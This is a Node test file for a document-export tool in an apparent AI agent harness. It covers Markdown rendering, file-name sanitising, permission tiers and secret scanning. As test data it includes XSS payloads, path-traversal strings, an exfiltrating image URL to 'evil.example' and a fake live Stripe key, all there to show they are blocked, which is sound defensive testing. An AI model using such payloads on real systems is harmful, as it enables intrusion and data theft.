// Headless tests for export_document: the page Markdown becomes, the file it is
// saved as, and the rules around where it may go. Pure Node - the PDF printer
// is a hook main.js attaches, so here it is a stub that hands back what it got.
//
//   node scripts/test-export-document.js
const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const H = require("../harness");
const D = require("../export-document");

const tests = [];
function test(name, fn) { tests.push({ name, fn }); }

// ─── Fixtures ────────────────────────────────────────────────────────────────
function workspace() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "crowe-export-"));
  fs.writeFileSync(path.join(dir, "a.txt"), "alpha\n");
  return dir;
}
function makeCtx(cfgPatch = {}, hooks = {}) {
  const dir = hooks.dir || workspace();
  const cfg = { autonomy: "edit", approvals: "high-risk", verifier: false, turnBudgetUsd: 0,
    autoApprove: true, model: "test-model", ...cfgPatch };
  const printed = [];
  const ctx = {
    dir, printed, journalEvents: [], approvalsSeen: [],
    getCwd: () => dir, setCwd: () => {},
    loadConfig: () => cfg,
    proposeEdit: async () => "applied edit",
    mcpTools: () => [], mcpCall: async () => "mcp result",
    openUrl: () => {},
    journal: (ev) => ctx.journalEvents.push(ev),
    artifactDir: () => path.join(dir, ".artifacts"),
    printToPdf: async (html) => { printed.push(html); return Buffer.from("%PDF-1.7 stub " + html.length); },
    rateIn: 1.25 / 1e6, rateOut: 10 / 1e6,
    ...hooks,
  };
  if (hooks.approve !== undefined) {
    ctx.requestApproval = async (req) => { ctx.approvalsSeen.push(req); return { approved: hooks.approve }; };
  }
  return ctx;
}
const state = (ctx) => H.newState(ctx, ctx.loadConfig(), {}, { expert: "operator", model: "m" });
const exportDoc = (ctx, args, route = {}) => H.callTool(ctx, "export_document", args, route, state(ctx));
const exportsDir = (ctx) => path.join(ctx.dir, "exports");

// ─── Markdown to HTML ────────────────────────────────────────────────────────
test("headings carry ids, repeated headings stay distinct, and setext headings count", () => {
  const html = D.markdownToHtml("# Title\n\n## Notes\n\n## Notes\n\nSetext\n======\n\nSub\n---\n");
  assert.match(html, /<h1 id="title">Title<\/h1>/);
  assert.match(html, /<h2 id="notes">Notes<\/h2>/);
  assert.match(html, /<h2 id="notes-2">Notes<\/h2>/);
  assert.match(html, /<h1 id="setext">Setext<\/h1>/);
  assert.match(html, /<h2 id="sub">Sub<\/h2>/);
});
test("paragraphs carry emphasis, code spans, strikethrough and hard breaks", () => {
  const html = D.markdownToHtml("Some **bold** and *em* and __strong__ and _also_ and ~~gone~~.  \nNext line\n\nSecond para with `code *not em*` and ``a ` b`` and 2 * 3 * 4.");
  assert.match(html, /<p>Some <strong>bold<\/strong> and <em>em<\/em> and <strong>strong<\/strong> and <em>also<\/em> and <del>gone<\/del>\.<br>\nNext line<\/p>/);
  assert.match(html, /<code>code \*not em\*<\/code> and <code>a ` b<\/code> and 2 \* 3 \* 4\./);
  assert.ok(!/<em>\s*<\/em>/.test(html));
});
test("fenced code keeps its language, escapes its contents, and survives a missing close", () => {
  const html = D.markdownToHtml("```js\nconst a = \"<b>&</b>\";\n```\n\n~~~\nplain <i>\n~~~\n\n```\nunterminated <x>");
  assert.match(html, /<pre><code class="language-js">const a = &quot;&lt;b&gt;&amp;&lt;\/b&gt;&quot;;\n<\/code><\/pre>/);
  assert.match(html, /<pre><code>plain &lt;i&gt;\n<\/code><\/pre>/);
  assert.match(html, /<pre><code>unterminated &lt;x&gt;\n<\/code><\/pre>/);
  assert.ok(!/<b>|<i>|<x>/.test(html));
});
test("lists nest by indentation, number from their start, and carry task boxes", () => {
  const html = D.markdownToHtml("- one\n- two\n  - nested\n    continued\n  - [ ] open\n  - [x] done\n- three\n\n3. third\n4. fourth\nlazy line\n\n- para item\n\n  second paragraph\n");
  assert.match(html, /<ul>\n<li>one<\/li>\n<li>two\n<ul>\n<li>nested\ncontinued<\/li>\n<li><input type="checkbox" disabled> open<\/li>\n<li><input type="checkbox" disabled checked> done<\/li>\n<\/ul><\/li>\n<li>three<\/li>\n<\/ul>/);
  assert.match(html, /<ol start="3">\n<li>third<\/li>\n<li>fourth\nlazy line<\/li>\n<\/ol>/);
  assert.match(html, /<li>para item\n<p>second paragraph<\/p><\/li>/);
});
test("tables read alignment from the separator and keep escaped pipes in cells", () => {
  const html = D.markdownToHtml("| Name | Qty | Note |\n|:-----|----:|:---:|\n| a \\| b | 2 | **x** |\n| short |\n\nafter");
  assert.match(html, /<thead><tr><th>Name<\/th><th class="align-right">Qty<\/th><th class="align-center">Note<\/th><\/tr><\/thead>/);
  assert.match(html, /<tr><td>a \| b<\/td><td class="align-right">2<\/td><td class="align-center"><strong>x<\/strong><\/td><\/tr>/);
  assert.match(html, /<tr><td>short<\/td><td class="align-right"><\/td><td class="align-center"><\/td><\/tr>/);
  assert.match(html, /<p>after<\/p>/);
  // A pipe in prose with no separator under it is prose.
  assert.match(D.markdownToHtml("a | b\nc | d"), /^<p>a \| b\nc \| d<\/p>$/);
});
test("blockquotes hold their own blocks, and rules are rules", () => {
  const html = D.markdownToHtml("> quoted **text**\n> - item\n\n---\n\n* * *\n");
  assert.match(html, /<blockquote>\n<p>quoted <strong>text<\/strong><\/p>\n<ul>\n<li>item<\/li>\n<\/ul>\n<\/blockquote>/);
  assert.strictEqual((html.match(/<hr>/g) || []).length, 2);
});
test("links keep http, https, mailto and anchors; every other target is shown as text", () => {
  const ok = D.markdownToHtml("[a](https://example.com/__init__/a_b?x=1&y=2) [b](http://h/p) [c](mailto:x@y.z) [d](#notes) <https://auto.example/x> [e](https://en.wikipedia.org/wiki/Foo_(bar)) [**f**](https://f.example \"F\")");
  assert.match(ok, /<a href="https:\/\/example.com\/__init__\/a_b\?x=1&amp;y=2">a<\/a>/);
  assert.match(ok, /<a href="http:\/\/h\/p">b<\/a> <a href="mailto:x@y.z">c<\/a> <a href="#notes">d<\/a> <a href="https:\/\/auto.example\/x">https:\/\/auto.example\/x<\/a>/);
  assert.match(ok, /<a href="https:\/\/en.wikipedia.org\/wiki\/Foo_\(bar\)">e<\/a>/);
  assert.match(ok, /<a href="https:\/\/f.example" title="F"><strong>f<\/strong><\/a>/);
  assert.ok(!/<strong>_|<em>/.test(ok), "emphasis must not rewrite a URL");
  for (const bad of ["javascript:alert(1)", "JAVASCRIPT:x", "data:text/html,hi", "file:///etc/passwd", "//evil.example/x",
    "../secrets.txt", "vbscript:x", "ftp://x/y"]) {
    const html = D.markdownToHtml(`[click](${bad})`);
    assert.ok(!html.includes("href="), `${bad} must not become a link: ${html}`);
    assert.ok(html.includes("click"), "the text stays");
  }
  // A quote inside an allowed URL stays inside the attribute.
  const quoted = D.markdownToHtml('[click](https://x.example/a"onclick="x)');
  assert.match(quoted, /<a href="https:\/\/x.example\/a&quot;onclick=&quot;x">click<\/a>/);
  assert.ok(!/"onclick=/.test(quoted), "the attribute must not be broken out of");
  assert.strictEqual(D.safeHref("https://example.com"), "https://example.com");
  assert.strictEqual(D.safeHref("  javascript:alert(1)"), null);
  assert.strictEqual(D.safeHref("java\tscript:alert(1)"), null);
  assert.strictEqual(D.safeHref("java\nscript:alert(1)"), null);
});
test("images draw only embedded raster data; a remote image becomes a reference", () => {
  const html = D.markdownToHtml("![logo](data:image/png;base64,iVBORw0KGgo=) ![leak](https://evil.example/c?d=secret) ![svg](data:image/svg+xml;base64,PHN2Zz4=) ![](https://x.example/p.png)");
  assert.match(html, /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="logo">/);
  assert.match(html, /<span class="image-ref">\[image: leak \(https:\/\/evil.example\/c\?d=secret\)\]<\/span>/);
  assert.match(html, /<span class="image-ref">\[image: https:\/\/x.example\/p.png\]<\/span>/);
  assert.ok(!/<img[^>]*https?:/.test(html), "no remote image source survives");
  assert.ok(!/<img[^>]*svg/.test(html), "svg is not embedded");
});
test("raw HTML is text, never markup", () => {
  const html = D.markdownToHtml("<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\nHello <b>there</b> & goodbye");
  assert.ok(!/<script|<img|<b>/.test(html));
  assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
  assert.match(html, /Hello &lt;b&gt;there&lt;\/b&gt; &amp; goodbye/);
});
test("the page stands alone: a title, a policy that fetches nothing, and its own styles", () => {
  const md = "```sh\n# not a heading\n```\n\n## Quarterly *notes*\n\ntext";
  assert.strictEqual(D.documentTitle(md, "", "fallback"), "Quarterly notes");
  assert.strictEqual(D.documentTitle("no headings", "", "fallback"), "fallback");
  assert.strictEqual(D.documentTitle(md, "Given <title>", "fallback"), "Given <title>");
  const html = D.documentHtml(md, { title: "Q3 <Report> & more" });
  assert.match(html, /^<!doctype html>\n<html lang="en">/);
  assert.match(html, /<title>Q3 &lt;Report&gt; &amp; more<\/title>/);
  assert.match(html, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'; frame-src 'none'; object-src 'none'">/);
  assert.match(html, /<style>\n@page[\s\S]*<\/style>/);
  assert.ok(!/<script/.test(html));
  assert.ok(!/url\(|@import|https?:\/\//.test(html.split("<main")[0]), "the head fetches nothing");
  assert.match(html, /<main class="document">\n<pre><code class="language-sh"># not a heading\n<\/code><\/pre>/);
});

// ─── The file name ───────────────────────────────────────────────────────────
test("a file name is a name: no directories, the format's extension, nothing a filesystem refuses", () => {
  assert.strictEqual(D.exportFileName("../../etc/passwd"), "passwd");
  assert.strictEqual(D.exportFileName("C:\\Users\\me\\Report.PDF"), "Report");
  assert.strictEqual(D.exportFileName("q3 summary.pdf"), "q3 summary");
  assert.strictEqual(D.exportFileName("notes.md"), "notes");
  assert.strictEqual(D.exportFileName("notes.v2"), "notes.v2");
  assert.strictEqual(D.exportFileName("what?/is*this:name"), "is-this-name");
  assert.strictEqual(D.exportFileName("  --spaced--  "), "spaced");
  assert.strictEqual(D.exportFileName(""), "document");
  assert.strictEqual(D.exportFileName(undefined), "document");
  assert.strictEqual(D.exportFileName("..."), "document");
  assert.strictEqual(D.exportFileName(".hidden"), "hidden");
  assert.strictEqual(D.exportFileName("NUL"), "document-NUL");
  assert.strictEqual(D.exportFileName("con.notes"), "document-con.notes");
  assert.strictEqual(D.exportFileName("COM1.pdf"), "document-COM1");
  assert.strictEqual(D.exportFileName("a\u0000b\u001fc"), "abc");
  assert.strictEqual(D.exportFileName("x".repeat(79) + "." + "y".repeat(30)), "x".repeat(79), "the cap must not leave a trailing dot");
  assert.strictEqual(D.exportFileName("y".repeat(200)).length, D.MAX_NAME_CHARS);
});

// ─── The tool ────────────────────────────────────────────────────────────────
test("pdf goes through the printer hook and lands under exports/", async () => {
  const ctx = makeCtx();
  const out = await exportDoc(ctx, { markdown: "# Q3 summary\n\nRevenue **up**.", filename: "q3-summary", format: "pdf" });
  const file = path.join(exportsDir(ctx), "q3-summary.pdf");
  assert.match(out.text, /^saved q3-summary\.pdf to /);
  assert.ok(out.text.includes(file), out.text);
  assert.strictEqual(out.status, "SUCCESS");
  assert.strictEqual(out.delivery, "compensatable");
  assert.strictEqual(ctx.printed.length, 1);
  assert.match(ctx.printed[0], /<title>Q3 summary<\/title>[\s\S]*<h1 id="q3-summary">Q3 summary<\/h1>[\s\S]*Revenue <strong>up<\/strong>/);
  assert.strictEqual(fs.readFileSync(file, "utf8"), "%PDF-1.7 stub " + ctx.printed[0].length);
  assert.ok(H.didMutate(ctx, "export_document", { filename: "q3-summary", format: "pdf" }, out.text), "an export is a change the verifier should see");
  assert.ok(ctx.journalEvents.some((e) => e.event_type === "TOOL_CALLED" && e.tool_id === "export_document"));
});
test("html and md are written directly, and the extension follows the format, not the name", async () => {
  const ctx = makeCtx();
  const html = await exportDoc(ctx, { markdown: "# Brief\n\ntext", filename: "brief.pdf", format: "html", title: "Given" });
  assert.match(html.text, /^saved brief\.html to /);
  const page = fs.readFileSync(path.join(exportsDir(ctx), "brief.html"), "utf8");
  assert.match(page, /^<!doctype html>/);
  assert.match(page, /<title>Given<\/title>/);
  const md = await exportDoc(ctx, { markdown: "# Brief\n\ntext", filename: "notes", format: "MD" });
  assert.match(md.text, /^saved notes\.md to /);
  assert.strictEqual(fs.readFileSync(path.join(exportsDir(ctx), "notes.md"), "utf8"), "# Brief\n\ntext\n");
  assert.strictEqual(ctx.printed.length, 0, "only pdf prints");
});
test("an existing document is left alone; the new one gets a numbered name", async () => {
  const ctx = makeCtx();
  fs.mkdirSync(exportsDir(ctx));
  fs.writeFileSync(path.join(exportsDir(ctx), "plan.md"), "original\n");
  const out = await exportDoc(ctx, { markdown: "new", filename: "plan", format: "md" });
  assert.match(out.text, /^saved plan-2\.md to /);
  assert.match(out.text, /plan\.md already existed and was left alone/);
  assert.strictEqual(fs.readFileSync(path.join(exportsDir(ctx), "plan.md"), "utf8"), "original\n");
  assert.strictEqual(fs.readFileSync(path.join(exportsDir(ctx), "plan-2.md"), "utf8"), "new\n");
  const again = await exportDoc(ctx, { markdown: "newer", filename: "plan", format: "md" });
  assert.match(again.text, /^saved plan-3\.md to /);
});
test("a document is a write: plan and read-only refuse it, edit allows it", async () => {
  for (const tier of ["plan", "readonly"]) {
    const ctx = makeCtx({ autonomy: tier });
    const out = await exportDoc(ctx, { markdown: "x", filename: "x", format: "md" });
    assert.match(out.text, /^blocked:/, tier);
    assert.ok(!fs.existsSync(exportsDir(ctx)), `${tier} must write nothing`);
  }
  const ctx = makeCtx({ autonomy: "edit" });
  assert.match((await exportDoc(ctx, { markdown: "x", filename: "x", format: "md" })).text, /^saved /);
  assert.match(H.TIER_LINES.plan, /export_document/);
  assert.match(H.TIER_LINES.edit, /export_document/);
});
test("the tool is offered to the operator and withheld from the verifier", async () => {
  const ctx = makeCtx();
  const named = (list) => list.some((t) => t.function.name === "export_document");
  assert.ok(named(H.BUILTIN_TOOLS));
  assert.ok(named(H.allTools(ctx, { expert: "operator" })));
  assert.ok(!named(H.verifierTools(ctx)));
  const out = await exportDoc(ctx, { markdown: "x", filename: "x", format: "md" }, { verify: true });
  assert.match(out.text, /^blocked: the verifier does not change anything/);
  assert.ok(!fs.existsSync(exportsDir(ctx)));
  const tool = H.BUILTIN_TOOLS.find((t) => t.function.name === "export_document");
  assert.deepStrictEqual(tool.function.parameters.properties.format.enum, ["pdf", "html", "md"]);
  assert.deepStrictEqual(tool.function.parameters.required, ["markdown", "filename", "format"]);
  const copy = JSON.stringify(tool);
  assert.ok(!copy.includes("\u2014") && !/\bAI\b/.test(copy), "house copy rules");
});
test("bad input is rejected before anything is rendered or written", async () => {
  const ctx = makeCtx();
  assert.match((await exportDoc(ctx, { markdown: "x", filename: "x", format: "docx" })).text, /^rejected: format must be pdf, html, or md/);
  // A name off Object.prototype is not a format either; the table is checked as own keys.
  for (const f of ["constructor", "toString", "__proto__", "hasOwnProperty"])
    assert.match((await exportDoc(ctx, { markdown: "x", filename: "x", format: f })).text, /^rejected: format must be/, f);
  assert.match((await exportDoc(ctx, { markdown: "x", filename: "x" })).text, /^rejected: format/);
  assert.match((await exportDoc(ctx, { markdown: "   \n", filename: "x", format: "pdf" })).text, /^rejected: markdown is empty/);
  assert.match((await exportDoc(ctx, { markdown: "y".repeat(D.MAX_MARKDOWN_CHARS + 1), filename: "x", format: "md" })).text, /^rejected: the document is/);
  assert.strictEqual(ctx.printed.length, 0);
  assert.ok(!fs.existsSync(exportsDir(ctx)));
});
test("without a printer, pdf says so and html still works", async () => {
  const ctx = makeCtx({}, { printToPdf: undefined });
  const pdf = await exportDoc(ctx, { markdown: "x", filename: "x", format: "pdf" });
  assert.match(pdf.text, /^error: this build has no PDF printer attached/);
  assert.ok(!fs.existsSync(exportsDir(ctx)));
  assert.match((await exportDoc(ctx, { markdown: "x", filename: "x", format: "html" })).text, /^saved x\.html/);
});
test("a printer that fails, or returns nothing, leaves nothing behind", async () => {
  const ctx = makeCtx({}, { printToPdf: async () => { throw new Error("printing took longer than 30s"); } });
  const out = await exportDoc(ctx, { markdown: "x", filename: "x", format: "pdf" });
  assert.match(out.text, /^error: printing the PDF failed \(printing took longer than 30s\)/);
  assert.strictEqual(out.status, "FAIL");
  assert.ok(!fs.existsSync(path.join(exportsDir(ctx), "x.pdf")));
  const empty = makeCtx({}, { printToPdf: async () => Buffer.alloc(0) });
  assert.match((await exportDoc(empty, { markdown: "x", filename: "x", format: "pdf" })).text, /^error: the PDF printer returned an empty document/);
  assert.ok(!fs.existsSync(path.join(exportsDir(empty), "x.pdf")));
});
test("a credential in the document asks first, and the value is never repeated", async () => {
  const ctx = makeCtx({}, { approve: false });
  // Split so this file is not itself a file full of secrets: the runtime value matches, the source does not.
  const key = "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc";
  const out = await exportDoc(ctx, { markdown: `# Keys\n\nUse ${key} in production.`, filename: "keys", format: "md" });
  assert.match(out.text, /^blocked:/);
  assert.strictEqual(ctx.approvalsSeen.length, 1);
  assert.match(ctx.approvalsSeen[0].why, /live Stripe secret key/);
  assert.strictEqual(ctx.approvalsSeen[0].kind, "export_document");
  for (const s of [out.text, JSON.stringify(ctx.approvalsSeen), JSON.stringify(ctx.journalEvents)])
    assert.ok(!s.includes(key), "the secret value must not be echoed anywhere");
  assert.ok(!fs.existsSync(exportsDir(ctx)));
  // The file name is the model's too, and it is scanned with the rest.
  const named = makeCtx({}, { approve: false });
  assert.match((await exportDoc(named, { markdown: "x", filename: key, format: "md" })).text, /^blocked:/);
  // Approved, it is written: the user said yes to exactly this.
  const yes = makeCtx({}, { approve: true });
  assert.match((await exportDoc(yes, { markdown: `key ${key}`, filename: "keys", format: "md" })).text, /^saved keys\.md/);
});
test("an exports/ that points outside the workspace asks, like any write outside it", async () => {
  const ctx = makeCtx({}, { approve: false });
  const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), "crowe-elsewhere-"));
  fs.symlinkSync(elsewhere, exportsDir(ctx));
  const out = await exportDoc(ctx, { markdown: "x", filename: "x", format: "md" });
  assert.match(out.text, /^blocked:/);
  assert.strictEqual(ctx.approvalsSeen[0].title, "Write outside the workspace");
  assert.deepStrictEqual(fs.readdirSync(elsewhere), []);
});
test("an exports that is a file, not a folder, is an error and not a crash", async () => {
  const ctx = makeCtx();
  fs.writeFileSync(exportsDir(ctx), "not a folder");
  const out = await exportDoc(ctx, { markdown: "x", filename: "x", format: "md" });
  assert.match(out.text, /^error: could not save the document/);
  assert.strictEqual(out.status, "FAIL");
});

// ─── Runner ──────────────────────────────────────────────────────────────────
(async () => {
  let passed = 0;
  const failures = [];
  for (const t of tests) {
    try { await t.fn(); passed += 1; process.stdout.write("."); }
    catch (e) { failures.push({ name: t.name, e }); process.stdout.write("x"); }
  }
  process.stdout.write("\n");
  if (failures.length) {
    for (const f of failures) {
      console.error(`\nFAIL: ${f.name}`);
      console.error(String((f.e && f.e.message) || f.e).split("\n").slice(0, 12).join("\n"));
    }
    console.error(`\n${passed} passed, ${failures.length} failed`);
    process.exit(1);
  }
  console.log(`export-document: ${passed} tests passed`);
})();
